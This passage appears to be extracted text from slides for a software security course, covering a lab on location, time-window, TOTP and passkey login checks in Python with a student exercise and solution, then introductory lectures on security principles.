+        "text": "Decision\nAll three, in this order: passkey, location, time\nCET431 Lab 5    \u00b7    location, time, passkey 14   /   38Click  \u00b7  next step\nThe first miss wins. A good passkey does not excuse London or 03:00.\nNearby, 10:00, good passkey\n4.3 km, hour 10, signature ok     ALLOW\nLondon, 10:00, good passkey\n3511.3 km     BLOCK (location)\nNearby, 03:00, good passkey\nhour 3     BLOCK (time)\nNearby, 10:00, bad signature\nsignature invalid     BLOCK (passkey)"
+      },
+      {
+        "page": 15,
+        "text": "The script\nThe functions behind the printout\nCET431 Lab 5    \u00b7    the code 15   /   38Click  \u00b7  next step\nOne run. Nothing is typed. Each show_ function calls the code beneath it.\nhaversine_km\nshow_location prints the kilometres, then INSIDE or OUTSIDE.\ntime_allowed\nshow_time prints ALLOW or BLOCK for one local hour.\ntotp\nshow_totp prints 547927, then 389939 thirty seconds later.\npasskey_allowed\nshow_passkey prints True for a genuine signature, then False.\ndecide\nshow_decisions prints ALLOW, or BLOCK and the first check that failed."
+      },
+      {
+        "page": 16,
+        "text": "Function  \u00b7  haversine_km\nDistance in kilometres\nCET431 Lab 5    \u00b7    the code 16   /   38Click  \u00b7  next step\nshow_location calls this three times. INSIDE means the result is at most 50 km.\ndef haversine_km(lat1, lon1, lat2, lon2):\n    phi1, lam1, phi2, lam2 = map(math.radians, (lat1, lon1, lat2, lon2))\n    dphi = phi2 - phi1\n    dlam = lam2 - lam1\n    a = sin(dphi/2)**2 + cos(phi1)*cos(phi2)*sin(dlam/2)**2\n    return 6371 * 2 * atan2(sqrt(a), sqrt(1 - a))\nSame point as home\nCall with the home point twice. Printed line: 0.0 km, INSIDE.\nNearby point\nCall with (30.0131, 31.2089). Printed line: 4.3 km, INSIDE.\nLondon\nCall with (51.5074, -0.1278). Printed line: 3511.3 km, OUTSIDE."
+      },
+      {
+        "page": 17,
+        "text": "Function  \u00b7  time_allowed\nThe hour window [8, 22)\nCET431 Lab 5    \u00b7    the code 17   /   38Click  \u00b7  next step\nshow_time calls time_allowed(hour, 8, 22). Start is included. End is excluded.\ndef time_allowed(hour, start_hour, end_hour):\n    return start_hour <= hour < end_hour\nhour  8     ALLOW\n8 <= 8 < 22 is true.\nhour 21     ALLOW\n8 <= 21 < 22 is true.\nhour 22     BLOCK\n8 <= 22 < 22 is false. 22 is the first blocked hour.\nhour  3     BLOCK\n8 <= 3 < 22 is false. The window does not wrap past midnight."
+      },
+      {
+        "page": 18,
+        "text": "Function  \u00b7  totp\nSix digits for one 30-second step\nCET431 Lab 5    \u00b7    the code 18   /   38Click  \u00b7  next step\ncounter = unix time // 30. HMAC-SHA1. Keep 31 bits. Print the last 6 digits.\ndef totp(secret, when, step=30, digits=6):\n    counter = int(when.timestamp()) // step\n    digest = hmac.new(secret, pack('>Q', counter), sha1).digest()\n    offset = digest[-1] & 0x0F\n    binary = unpack('>I', digest[offset:offset + 4])[0] & 0x7FFFFFFF\n    return the last 6 digits of binary\n547927\n22 Oct 2026, 07:00 UTC. That is 10:00 in UTC+3. This is the printed code.\n389939\nAdd 30 seconds. The counter increases by 1, so the code changes.\nNot in the hands-on\nStudents write time_allowed, not totp. The 6-digit code is the demo only."
+      },
+      {
+        "page": 19,
+        "text": "Function  \u00b7  show_passkey\nSign the challenge, then verify it\nCET431 Lab 5    \u00b7    the code 19   /   38Click  \u00b7  next step\nChallenge text: CET431-login-challenge. The private key stays on the authenticator.\n1   Build the key\nEd25519PrivateKey.from_private_bytes(PASSKEY_SEED). The seed makes this run repeat.\n2   Sign\nsignature = private.sign(CHALLENGE). The server will store only the public key.\n3   Genuine check   True\npublic.verify(signature, CHALLENGE) does not raise. Printed: Genuine signature checks   True\n4   Flipped byte   False\ntampered[0] ^= 0x01, then verify raises. Printed: One flipped byte checks   False"
+      },
+      {
+        "page": 20,
+        "text": "Function  \u00b7  passkey_allowed\nBoth arguments must be true\nCET431 Lab 5    \u00b7    the code 20   /   38Click  \u00b7  next step\nshow_passkey prints these three calls after the signature check.\ndef passkey_allowed(credential_matches, signature_valid):\n    return bool(credential_matches) and bool(signature_valid)\npasskey_allowed(True, True)    True\nMatching credential and a genuine signature. This login may continue.\npasskey_allowed(True, False)   False\nThe credential matches, but the flipped signature does not.\npasskey_allowed(False, True)   False\nThe signature would be valid for a different credential id."
+      },
+      {
+        "page": 21,
+        "text": "Function  \u00b7  decide\nStop at the first miss\nCET431 Lab 5    \u00b7    the code 21   /   38Click  \u00b7  next step\nOrder inside the function: passkey, then location, then time.\nif not passkey_allowed(...)\nreturn \"BLOCK (passkey)\"    Location and time are not checked.\nif distance_km > 50\nreturn \"BLOCK (location)\"    The passkey already passed. The clock is not checked.\nif not time_allowed(hour, 8, 22)\nreturn \"BLOCK (time)\"    Passkey and location already passed.\notherwise\nreturn \"ALLOW\"    All three checks passed."
+      },
+      {
+        "page": 22,
+        "text": "Output  \u00b7  show_decisions\nThe four printed logins\nCET431 Lab 5    \u00b7    the code 22   /   38Click  \u00b7  next step\nThese four lines are the last block of the console.\nNearby, 10:00, good passkey     ALLOW\nPasskey true, 4.3 km is within 50, hour 10 is inside [8, 22).\nLondon, 10:00, good passkey      BLOCK (location)\nPasskey true, then 3511.3 > 50. The hour is never read.\nNearby, 03:00, good passkey      BLOCK (time)\nPasskey true and 4.3 km is inside. Hour 3 is outside the window.\nNearby, 10:00, bad signature     BLOCK (passkey)\npasskey_allowed is false, so distance and hour are not read."
+      },
+      {
+        "page": 23,
+        "text": "Function  \u00b7  main\nThe console, from top to bottom\nCET431 Lab 5    \u00b7    the code 23   /   38Click  \u00b7  next step\nheading() prints the bar of equals signs. The show_ functions print the rows.\ndef main():\n    show_location()\n    show_time()\n    show_totp()\n    show_passkey()\n    show_decisions()\n1   Location     show_location, which calls haversine_km.\n2   Time window     show_time, which calls time_allowed.\n3   TOTP     show_totp, which calls totp twice.\n4   Passkey     show_passkey, which signs, verifies, then calls passkey_allowed.\n5   Combined login     show_decisions, which calls decide four times."
+      },
+      {
+        "page": 24,
+        "text": "Output  \u00b7  show_location\nLocation, as the lab prints it\nCET431 Lab 5    \u00b7    lab printout 24   /   38Click  \u00b7  next step\nhaversine_km from home (30.0444, 31.2357). INSIDE means the distance is at most 50 km.\nCET431 Lab 5 - location, time, and passkey\n================================================================\n1. Location - distance from the enrolled home\n================================================================\nHome   (30.0444, 31.2357)   radius 50 km\n  Same point as home       0.0 km   INSIDE\n  Nearby point             4.3 km   INSIDE\n  London                3511.3 km   OUTSIDE\nSame point as home    0.0 km    INSIDE\nThe home point compared with itself. The distance is zero.\nNearby point    4.3 km    INSIDE\n(30.0131, 31.2089) is about 4.3 km away, inside the radius.\nLondon    3511.3 km    OUTSIDE\n(51.5074, -0.1278) is far beyond 50 km."
+      },
+      {
+        "page": 25,
+        "text": "Output  \u00b7  show_time\nTime window, as the lab prints it\nCET431 Lab 5    \u00b7    lab printout 25   /   38Click  \u00b7  next step\ntime_allowed(hour, 8, 22). True when 8 <= hour < 22.\n================================================================\n2. Time window - local hour, 8 inclusive until 22 exclusive\n================================================================\n  hour  8   ALLOW\n  hour 21   ALLOW\n  hour 22   BLOCK\n  hour  3   BLOCK\nhour  8    ALLOW      8 <= 8 < 22 is true. 8 is the first allowed hour.\nhour 21    ALLOW      8 <= 21 < 22 is true. 21 is the last allowed hour.\nhour 22    BLOCK      8 <= 22 < 22 is false. 22 is the first blocked hour.\nhour  3    BLOCK      8 <= 3 < 22 is false. The window does not wrap past midnight."
+      },
+      {
+        "page": 26,
+        "text": "Output  \u00b7  show_totp\nTOTP , as the lab prints it\nCET431 Lab 5    \u00b7    lab printout 26   /   38Click  \u00b7  next step\ntotp at the frozen instant 22 Oct 2026, 07:00 UTC, which is 10:00 in UTC+3.\n================================================================\n3. TOTP - a code that changes every 30 seconds\n================================================================\n  Frozen instant     2026-10-22 07:00 UTC\n  Local hour         10:00 in UTC+3\n  Code at that step  547927\n  Code 30s later     389939\n  The hands-on uses the clock window, not the 6-digit code.\n547927\nThe code for that frozen step. HMAC-SHA1, then the last 6 digits.\n389939\nThirty seconds later. Same secret, next counter.\nNot in the hands-on\nStudents write time_allowed. This 6-digit code is the lab demo only."
+      },
+      {
+        "page": 27,
+        "text": "Output  \u00b7  show_passkey\nPasskey, as the lab prints it\nCET431 Lab 5    \u00b7    lab printout 27   /   38Click  \u00b7  next step\nChallenge CET431-login-challenge. The private key stays on the authenticator.\n================================================================\n4. Passkey - the server checks a signature, not a password\n================================================================\n  Challenge                  CET431-login-challenge\n  Private key                stays on the authenticator\n  Genuine signature checks   True\n  One flipped byte checks    False\n  passkey_allowed(True, True)   True\n  passkey_allowed(True, False)  False\n  passkey_allowed(False, True)  False\nGenuine check    True\npublic.verify(signature, CHALLENGE) does not raise.\nOne flipped byte    False\ntampered[0] ^= 0x01, then verify raises.\nOnly (True, True) is True\nA bad signature or a different credential id returns False."
+      },
+      {
+        "page": 28,
+        "text": "Output  \u00b7  show_decisions\nCombined login, as the lab prints it\nCET431 Lab 5    \u00b7    lab printout 28   /   38Click  \u00b7  next step\ndecide checks passkey, then location, then time. The first miss returns.\n================================================================\n5. A login needs location, time, and passkey\n================================================================\n  Nearby, 10:00, good passkey      ALLOW\n  London, 10:00, good passkey      BLOCK (location)\n  Nearby, 03:00, good passkey      BLOCK (time)\n  Nearby, 10:00, bad signature     BLOCK (passkey)\nALLOW      Passkey true, 4.3 km is within 50, and hour 10 is inside the window.\nBLOCK (location)      Passkey true, then 3511.3 > 50. The hour is not read.\nBLOCK (time)      Passkey true and 4.3 km is inside. Hour 3 is outside [8, 22).\nBLOCK (passkey)      passkey_allowed is false, so distance and hour are not read."
+      },
+      {
+        "page": 29,
+        "text": "Hands-on \u00b7 3 marks\nYour turn: three empty functions, 3 marks\nCET431 Lab 5    \u00b7    location, time, passkey 29   /   38\nThe next slides are the full file. Copy them in order into lab 5 students hands on.py.\ndef haversine_km(lat1, lon1, lat2, lon2):\n    # distance in km. Use the formula in the file comment.\ndef time_allowed(hour, start_hour, end_hour):\n    # True when start_hour <= hour < end_hour\ndef passkey_allowed(credential_matches, signature_valid):\n    # True only when both arguments are true\n3 marks, one function each\n0.0 km INSIDE    4.3 km INSIDE    3511.3 km OUTSIDE\nhours 8 and 21 ALLOW    hours 22 and 3 BLOCK\nonly passkey_allowed(True, True) is ALLOW"
+      },
+      {
+        "page": 30,
+        "text": "Hands-on  \u00b7  3 marks  \u00b7  part 1 of 6\nCopy the file, part 1 of 6\nCET431 Lab 5    \u00b7    copy, then replace pass 30   /   38Click  \u00b7  show this part\nCreate lab 5 students hands on.py and paste this first. Leave every pass in place.\n\"\"\"CET431 Lab 5 hands-on \u2014 3 marks.\nComplete the three functions below. Do not change the constants or the driver.\nCompare your printed table with the Lab 5 slides.\n    python \"lab 5 students hands on.py\"\n\"\"\"\nimport math\nHOME_LAT, HOME_LON = 30.0444, 31.2357\nNEAR_LAT, NEAR_LON = 30.0131, 31.2089\nLONDON_LAT, LONDON_LON = 51.5074, -0.1278\nRADIUS_KM = 50.0\nTIME_START = 8\nTIME_END = 22"
+      },
+      {
+        "page": 31,
+        "text": "Hands-on  \u00b7  3 marks  \u00b7  part 2 of 6\nCopy the file, part 2 of 6\nCET431 Lab 5    \u00b7    copy, then replace pass 31   /   38Click  \u00b7  show this part\nPaste this directly under part 1. Still do not fill in the functions.\ndef haversine_km(lat1, lon1, lat2, lon2):\n    \"\"\"Return the distance in kilometres between two latitude/longitude points.\n    Earth radius = 6371 km.\n    1. Convert lat1, lon1, lat2, lon2 from degrees to radians.\n    2. dlat = lat2 - lat1,  dlon = lon2 - lon1   (both in radians)\n    3. a = sin(dlat/2)**2 + cos(lat1)*cos(lat2)*sin(dlon/2)**2\n    4. distance = 6371 * 2 * atan2(sqrt(a), sqrt(1 - a))\n    \"\"\"\n    pass"
+      },
+      {
+        "page": 32,
+        "text": "Hands-on  \u00b7  3 marks  \u00b7  part 3 of 6\nCopy the file, part 3 of 6\nCET431 Lab 5    \u00b7    copy, then replace pass 32   /   38Click  \u00b7  show this part\nPaste this directly under part 2. Still do not fill in the functions.\ndef time_allowed(hour, start_hour, end_hour):\n    \"\"\"Return True when hour is inside the window [start_hour, end_hour).\n    start_hour is included. end_hour is excluded.\n    This lab does not wrap past midnight: start_hour is always less than end_hour.\n    \"\"\"\n    pass\ndef passkey_allowed(credential_matches, signature_valid):\n    \"\"\"Return True only when the credential id matches AND the signature verifies.\"\"\"\n    pass\n# ----------- Driver code: do NOT change -----------\ndef _km(lat, lon):\n    return haversine_km(HOME_LAT, HOME_LON, lat, lon)"
+      },
+      {
+        "page": 33,
+        "text": "Hands-on  \u00b7  3 marks  \u00b7  part 4 of 6\nCopy the file, part 4 of 6\nCET431 Lab 5    \u00b7    copy, then replace pass 33   /   38Click  \u00b7  show this part\nPaste this directly under part 3. Still do not fill in the functions.\ndef _line(name, value):\n    if value is None:\n        print(f\"  {name:<28} not implemented yet\")\n    else:\n        print(f\"  {name:<28} {value}\")\nprint(\"Location  (radius 50 km)\")\nfor label, lat, lon in (\n    (\"Same point\", HOME_LAT, HOME_LON),\n    (\"Nearby point\", NEAR_LAT, NEAR_LON),\n    (\"London\", LONDON_LAT, LONDON_LON),\n):\n    distance = _km(lat, lon)\n    if distance is None:\n        _line(label, None)\n    else:\n        place = \"INSIDE\" if distance <= RADIUS_KM else \"OUTSIDE\"\n        _line(label, f\"{distance:8.1f} km   {place}\")"
+      },
+      {
+        "page": 34,
+        "text": "Hands-on  \u00b7  3 marks  \u00b7  part 5 of 6\nCopy the file, part 5 of 6\nCET431 Lab 5    \u00b7    copy, then replace pass 34   /   38Click  \u00b7  show this part\nPaste this directly under part 4. Still do not fill in the functions.\nprint(\"\\nTime window  [8, 22)\")\nfor hour in (8, 21, 22, 3):\n    allowed = time_allowed(hour, TIME_START, TIME_END)\n    if allowed is None:\n        _line(f\"hour {hour}\", None)\n    else:\n        _line(f\"hour {hour}\", \"ALLOW\" if allowed else \"BLOCK\")\nprint(\"\\nPasskey\")\nfor label, credential, signature in (\n    (\"Matching genuine signature\", True, True),\n    (\"Matching bad signature\", True, False),\n    (\"Wrong credential id\", False, True),\n):\n    allowed = passkey_allowed(credential, signature)\n    if allowed is None:\n        _line(label, None)\n    else:\n        _line(label, \"ALLOW\" if allowed else \"BLOCK\")"
+      },
+      {
+        "page": 35,
+        "text": "Hands-on  \u00b7  3 marks  \u00b7  part 6 of 6\nCopy the file, part 6 of 6\nCET431 Lab 5    \u00b7    copy, then replace pass 35   /   38Click  \u00b7  show this part\nPaste this directly under part 5. Still do not fill in the functions.\nprint(\"\\nCombined login  (passkey, then location, then time)\")\nnear = _km(NEAR_LAT, NEAR_LON)\nfar = _km(LONDON_LAT, LONDON_LON)\nlogins = (\n    (\"Nearby, 10:00, good passkey\", near, 10, True, True),\n    (\"London, 10:00, good passkey\", far, 10, True, True),\n    (\"Nearby, 03:00, good passkey\", near, 3, True, True),\n    (\"Nearby, 10:00, bad signature\", near, 10, True, False),\n)\nfor label, distance, hour, credential, signature in logins:\n    if distance is None or time_allowed(hour, TIME_START, TIME_END) is None or passkey_allowed(credential, signature) is None:\n        _line(label, None)\n        continue\n    if not passkey_allowed(credential, signature):\n        decision = \"BLOCK (passkey)\"\n    elif distance > RADIUS_KM:\n        decision = \"BLOCK (location)\"\n    elif not time_allowed(hour, TIME_START, TIME_END):\n        decision = \"BLOCK (time)\"\n    else:\n        decision = \"ALLOW\"\n    _line(label, decision)"
+      },
+      {
+        "page": 36,
+        "text": "After the exercise\nSolution: show this after the attempt\nCET431 Lab 5    \u00b7    location, time, passkey 36   /   38Click  \u00b7  next step\nOne mark each. The driver already combines them as passkey, then location, then time.\ndef haversine_km(lat1, lon1, lat2, lon2):\n    p1, l1, p2, l2 = map(math.radians, (lat1, lon1, lat2, lon2))\n    dlat, dlon = p2 - p1, l2 - l1\n    a = math.sin(dlat / 2) ** 2\n    a += math.cos(p1) * math.cos(p2) * math.sin(dlon / 2) ** 2\n    return 6371 * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))\ndef time_allowed(hour, start_hour, end_hour):\n    return start_hour <= hour < end_hour\ndef passkey_allowed(credential_matches, signature_valid):\n    return credential_matches and signature_valid"
+      },
+      {
+        "page": 37,
+        "text": "After the exercise\nSolution: what the hands-on driver prints\nCET431 Lab 5    \u00b7    location, time, passkey 37   /   38Click  \u00b7  next step\nCombined login, after the three functions return the values from the example.\nNearby, 10:00, good passkey     ALLOW\nLondon, 10:00, good passkey     BLOCK (location)\nNearby, 03:00, good passkey     BLOCK (time)\nNearby, 10:00, bad signature     BLOCK (passkey)"
+      },
+      {
+        "page": 38,
+        "text": "Close\nRun the lab, then the hands-on\nCET431 Lab 5    \u00b7    location, time, passkey 38   /   38\nQuiz in week 7. It is on the lecture content.\n1 python CET431-Lab5-Location-Time-Passkey.py\nWatch location, the time window, TOTP 547927, and the passkey check.\n2 python \"lab 5 students hands on.py\"\nThe empty functions print 'not implemented yet' until they are written.\n3 Three functions, 3 marks\nhaversine_km, time_allowed, passkey_allowed. Leave the driver alone."
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lecture 1.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "CET431- Software Security\nDr. Ayman Taha - Dr. Donia Gamal\nDr. Ayman Taha - Dr. Donia Gamal 1\nLecture 1\n"
+      },
+      {
+        "page": 2,
+        "text": "Teaching Staff\nDr. Ayman Taha - Dr. Donia Gamal 2\n\u2022 Prof. Ayman Taha (ayman.taha@sut.edu.eg)\n\u2022 Dr. Donia Gamal (donia.gamal@sut.edu.eg)\noffice hours: Mon. 12:30 pm at Room 022\nTeaching Assistant:\n\u2022 Eng. Ahmed Awad\n\u2022 Eng. Manal Amr\nQuestions outside office hours: email or LMS forum"
+      },
+      {
+        "page": 3,
+        "text": "Mark Distribution\nDr. Ayman Taha - Dr. Donia Gamal 3\nQUIZZES ( 4 Quizzes [Top 3])\n\u202215 Marks\nHands-on / \nAssignments/Participation/ \nLab Assessment\n\u202225 Marks\nPractical Exam\n\u202220 Marks\n"
+      },
+      {
+        "page": 4,
+        "text": "Resources\nDr. Ayman Taha - Dr. Donia Gamal 4\n"
+      },
+      {
+        "page": 5,
+        "text": "What You Will Learn\nDr. Ayman Taha - Dr. Donia Gamal 5\n\u2022 Explain how the CIA triad, together with authentication, authorization, accountability, and non-\nrepudiation, establishes the foundational goals of application security.\n\u2022 Apply core access-control principles to software design decisions.\n\u2022 Develop a secure software lifecycle management approach that integrates strategy, development \nmethodology, risk management, and security standards.\n\u2022 Apply secure coding practices for variable declaration, input/output handling, secret protection, \ndata-flow security, isolation, and deployment to mitigate OWASP Top 10 and CWE vulnerabilities.\n\u2022 Plan a comprehensive security testing strategy that combines automated and manual techniques, \nvalidates cryptography, secures test data, and classifies and tracks the security implications of test \nresults."
+      },
+      {
+        "page": 6,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 7\nWhat is Software Security?"
+      },
+      {
+        "page": 7,
+        "text": "Software Security\n\u201c Idea of engineering software so that it continues to \nfunction correctly under malicious attack \u201d\n\u25cf Existing software is riddled with design flaws and implementation bugs.\n\u25cf Software Security refers to a set of practices that help protect software applications and \ndigital solutions from attackers. \n\u25cf Developers incorporate these techniques into the software development life cycle and \ntesting processes. \n\u25cf As a result, companies can ensure their digital solutions remain secure and are able to \nfunction in the event of a malicious attack.\nDr. Ayman Taha - Dr. Donia Gamal 8"
+      },
+      {
+        "page": 8,
+        "text": "Overview\n\u25cf Software plays a major role in providing security and is a major source of \nsecurity problems.\n\u25cb Software plays a critical role in providing security, protecting sensitive \ndata, business processes, systems, and users from unauthorized access \nand attacks. \n\u25cb Design flaws, insecure coding practices, configuration errors, and \nimplementation weaknesses can introduce serious security risks.\nDr. Ayman Taha - Dr. Donia Gamal 9"
+      },
+      {
+        "page": 9,
+        "text": "Overview\n\u25cf Software security does not get much attention\n\u25cb In programming courses\n\u25a0 Software security often receives insufficient attention in \ntraditional programming education.\n\u25a0 Many programming courses focus primarily on functionality, \nperformance, and code correctness, while security is treated as a \nseparate or secondary concern.\n\u25a0 Many future software developers receive limited formal training \nin secure software development. As a result, they may know how \nto make software work but not necessarily how to make it secure. \nDr. Ayman Taha - Dr. Donia Gamal 10"
+      },
+      {
+        "page": 10,
+        "text": "Overview\n\u25cf Software security does not get much attention\n\u25cb In software company\u2019s goal\n\u25a0 Security is sometimes considered a specialized responsibility of \nsecurity teams rather than a shared responsibility of developers, \narchitects, testers, and project managers. \n\u25a0 In many software companies, the primary goals are often \ndelivering features quickly, meeting deadlines, reducing costs, \nand satisfying business requirements. Security may receive less \nattention when it competes with these priorities.\nDr. Ayman Taha - Dr. Donia Gamal 11"
+      },
+      {
+        "page": 11,
+        "text": "Overview\n\u25cf Therefore, security should be considered from the beginning of software \ndevelopment, rather than added as an afterthought. \n\u25cf The goal of Secure Software Development is to integrate security into \nrequirements, design, coding, testing, deployment, and maintenance so \nthat security becomes an inherent property of the software\nDr. Ayman Taha - Dr. Donia Gamal 12"
+      },
+      {
+        "page": 12,
+        "text": "Overview\nWe focus on software security, but don\u2019t forget that security is about \nmany things:\n\u25cb people \n\u25a0 human computer interaction, HCI\n\u25a0 Attackers, users, employees, sys-admins, programmers\n\u25cb access control, passwords, biometrics\n\u25cb cryptology, protocols\n\u25cb Monitoring, auditing, risk management\n\u25cb Policy, etc.\n\u25cb \u2026.\nDr. Ayman Taha - Dr. Donia Gamal 13"
+      },
+      {
+        "page": 13,
+        "text": "Security Terminologies in software\n\u25cf Defects are implementation vulnerabilities and design vulnerabilities. \n\u25cf Bugs are implementation-level errors that can be detected and removed.\n\u25cb Example: Buffer overflow. \n\u25cf Flaws are problems at a deeper level. They are instantiated in the code and \npresent or absent at design-level.\n\u25cb Example: Error-handling problems. \n\u25cf Failures are the inability of the software to perform its required function.\n\u25cf Risks capture the probability that a flaw or a bug will impact the purpose of the \nsoftware. \n\u25cb Risk = probability x impact \n\u25cf Vulnerabilities are errors that an attacker can exploit. \n\u25cb Either flaws in the design or flaws in the implementation.\n\u25cb Design-level vulnerabilities are the hardest defects to handle.\nDr. Ayman Taha - Dr. Donia Gamal 14"
+      },
+      {
+        "page": 14,
+        "text": "The CIA Triad\nDr. Ayman Taha - Dr. Donia Gamal 15\nFoundational to every domain in the SDLC which is considered as the cornerstone of \ninformation security."
+      },
+      {
+        "page": 15,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 16\n"
+      },
+      {
+        "page": 16,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 17\n"
+      },
+      {
+        "page": 17,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 18\n"
+      },
+      {
+        "page": 18,
+        "text": "Starting Point for Ensuring Security\n\u25cf Any discussion of security should start with an inventory of\n\u25cb the stakeholders (owners, companies\u2026)\n\u25cb their assets (data, service, customer info\u2026)\n\u25cb the threats to these assets (erase, steal\u2026)\n\u25cb Attackers \n\u25a0 employees, clients, script kiddies, criminals\n\u25cf Any discussion of security without understanding these issues \nis meaningless\nDr. Ayman Taha - Dr. Donia Gamal 19"
+      },
+      {
+        "page": 19,
+        "text": "Security Concept\nDr. Ayman Taha - Dr. Donia Gamal 20"
+      },
+      {
+        "page": 20,
+        "text": "Top 10 Web Application Security Risks\nDr. Ayman Taha - Dr. Donia Gamal 21\n"
+      },
+      {
+        "page": 21,
+        "text": "Top 10 Web Application Security Risks\nDr. Ayman Taha - Dr. Donia Gamal 22\n"
+      },
+      {
+        "page": 22,
+        "text": "How to Realize Security Objectives? AAAA\n\u25cf Authentication\n\u25cb who are you?\n\u25cf Access control/Authorization\n\u25cb control who is allowed to do what\n\u25cb this requires a specification of who is \nallowed to do what\n\u25cf Auditing\n\u25cb check if anything went wrong\n\u25cf Action\n\u25cb if so, take action\nDr. Ayman Taha - Dr. Donia Gamal 23"
+      },
+      {
+        "page": 23,
+        "text": "Threats vs Security Requirements\n\u25cf Information Disclosure\n\u25cb Confidentiality\n\u25cf Tampering With Information\n\u25cb Integrity\n\u25cf Denial-of-Service (DoS)\n\u25cb availability\n\u25cf Spoofing\n\u25cb authentication\n\u25cf Unauthorized access\n\u25cb access control\nDr. Ayman Taha - Dr. Donia Gamal 24"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lecture 2.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "CET431- Software Security\nDr. Ayman Taha - Dr. Donia Gamal\nDr. Ayman Taha - Dr. Donia Gamal 1\nLecture 2\n"
+      },
+      {
+        "page": 2,
+        "text": "Teaching Staff\nDr. Ayman Taha - Dr. Donia Gamal 2\n\u2022 Prof. Ayman Taha (ayman.taha@sut.edu.eg)\n\u2022 Dr. Donia Gamal (donia.gamal@sut.edu.eg)\noffice hours: Mon. 12:30 pm at Room 022\nTeaching Assistant:\n\u2022 Eng. Ahmed Awad\n\u2022 Eng. Manal Amr\nQuestions outside office hours: email or LMS forum"
+      },
+      {
+        "page": 3,
+        "text": "Mark Distribution\nDr. Ayman Taha - Dr. Donia Gamal 3\nQUIZZES ( 4 Quizzes [Top 3])\n\u202215 Marks\nHands-on / \nAssignments/Participation/ \nLab Assessment\n\u202225 Marks\nPractical Exam\n\u202220 Marks\n"
+      },
+      {
+        "page": 4,
+        "text": "Top 10 Web Application Security Risks\nDr. Ayman Taha - Dr. Donia Gamal 4\n"
+      },
+      {
+        "page": 5,
+        "text": "Security in Every \nPhase\nThis domain focuses on fundamental security principles\nand how to begin applying them to the SDLC.\nDr. Ayman Taha - Dr. Donia Gamal 5\n"
+      },
+      {
+        "page": 6,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 6\n"
+      },
+      {
+        "page": 7,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 7\n"
+      },
+      {
+        "page": 8,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 8\n"
+      },
+      {
+        "page": 9,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 9"
+      },
+      {
+        "page": 10,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 10\n"
+      },
+      {
+        "page": 11,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 11\n"
+      },
+      {
+        "page": 12,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 12"
+      },
+      {
+        "page": 13,
+        "text": "DREAD Threat Modeling\n13\nDr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 14,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 14"
+      },
+      {
+        "page": 15,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 15\n"
+      },
+      {
+        "page": 16,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 16\n"
+      },
+      {
+        "page": 17,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 17\n"
+      },
+      {
+        "page": 18,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 18\n"
+      },
+      {
+        "page": 19,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 19\n"
+      },
+      {
+        "page": 20,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 20\n"
+      },
+      {
+        "page": 21,
+        "text": "Security in Every Phase\nDr. Ayman Taha - Dr. Donia Gamal 21\n"
+      },
+      {
+        "page": 22,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 22\n1.\n2\n3\n4"
+      },
+      {
+        "page": 23,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 23\nSoftware Security Principles (link)"
+      },
+      {
+        "page": 24,
+        "text": "Authorization\nDr. Ayman Taha - Dr. Donia Gamal 24\n"
+      },
+      {
+        "page": 25,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 25"
+      },
+      {
+        "page": 26,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 26\n"
+      },
+      {
+        "page": 27,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 27\nPrinciple of Nonrepudiation"
+      },
+      {
+        "page": 28,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 28\nPrinciple of Nonrepudiation"
+      },
+      {
+        "page": 29,
+        "text": "Thanks!\nDo you have any questions?\nDr. Ayman Taha - Dr. Donia Gamal 29\n"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lecture 3.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "CET431- Software Security\nDr. Ayman Taha - Dr. Donia Gamal\nDr. Ayman Taha - Dr. Donia Gamal 1\nLecture 3\n"
+      },
+      {
+        "page": 2,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 3\nSoftware Security Principles (link)"
+      },
+      {
+        "page": 3,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 9\n"
+      },
+      {
+        "page": 4,
+        "text": "Minimize Common Mechanism Principle\nDr. Ayman Taha - Dr. Donia Gamal 10\n\u2022 Minimize the amount of functionality/resources that different users or components share.\n\u2022 Because if many things depend on the same mechanism, compromising that mechanism can affect \neveryone.\n\u2022 Give each user/component only the resources and functionality it needs. \n\u2022 Avoid excessive sharing of: \no Accounts & credentials \no Files & databases \no Services & processes \no Privileged functions \nExample:\nOne shared administrator account \u2192 compromise affects everyone.\nIndividual accounts + role-based permissions \u2192 compromise is contained."
+      },
+      {
+        "page": 5,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 11\n"
+      },
+      {
+        "page": 6,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 12\n"
+      },
+      {
+        "page": 7,
